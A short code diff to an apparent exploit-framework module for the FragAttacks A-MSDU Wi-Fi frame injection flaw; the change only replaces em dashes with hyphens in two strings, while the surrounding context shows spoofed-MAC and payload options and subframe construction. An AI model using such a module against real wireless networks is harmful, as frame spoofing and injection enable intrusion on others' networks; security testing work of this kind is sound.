@@ -66,7 +66,7 @@ class Exploit(Exploit):
     dst_mac = OptString("ff:ff:ff:ff:ff:ff", "Target destination MAC (dash or colon separated)")
     src_mac = OptString("de:ad:be:ef:00:01", "Spoofed source MAC")
     payload_hex = OptString("aaaa0800", "Inner payload hex (IPv4/ARP default)")
-    dry_run = OptBool(True, "Dry run — show frame only")
+    dry_run = OptBool(True, "Dry run  -  show frame only")
 
     @mute
     def check(self) -> bool:
@@ -88,7 +88,7 @@ class Exploit(Exploit):
         payload = bytes.fromhex(payload_hex)
         subframe = _build_amsdu_subframe(dst, src, payload)
 
-        print_status(f"FragAttacks AMSDU mesh frame — {_CVE}")
+        print_status(f"FragAttacks AMSDU mesh frame  -  {_CVE}")
         print_info(f"A-MSDU subframe ({len(subframe)} bytes): {subframe.hex()}")
 
         if dry_run:
